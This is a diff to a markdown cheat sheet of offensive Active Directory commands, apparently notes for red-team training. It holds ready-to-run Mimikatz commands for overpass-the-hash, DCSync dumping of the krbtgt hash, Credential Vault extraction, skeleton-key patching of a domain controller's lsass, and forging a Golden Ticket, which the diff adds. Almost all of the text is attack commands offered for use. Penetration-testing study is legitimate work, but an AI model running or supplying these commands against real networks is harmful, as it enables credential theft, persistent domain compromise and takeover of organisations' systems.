@@ -86,7 +86,7 @@ C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 - **OverPass the Hash (OPTH)**
 ```powershell
 # Starts Powershell with logon type 9
-C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:us.techcorp.local /aes256:<user_aes256key> /run:cmd.exe"'
+C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<fqdn_domain> /aes256:<user_aes256key> /run:cmd.exe"'
 ```
 - **Get KRBTGT Hash**
 ```powershell
@@ -98,11 +98,17 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
 - **Credentials from Credential Vault**
 ```powershell
+# Interesting Credentials are stored here, like credentials for scheduled tasks
 C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 - **Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.
 ```powershell
 C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname_full_FQDN>
+```
+##### Golden Ticket
+```powershell
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:<username> /domain:<domain_fqdn> /sid:<domain_sid> 
+    /aes256:<krbtgt_aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
 ```
 ### Rubeus
 ---
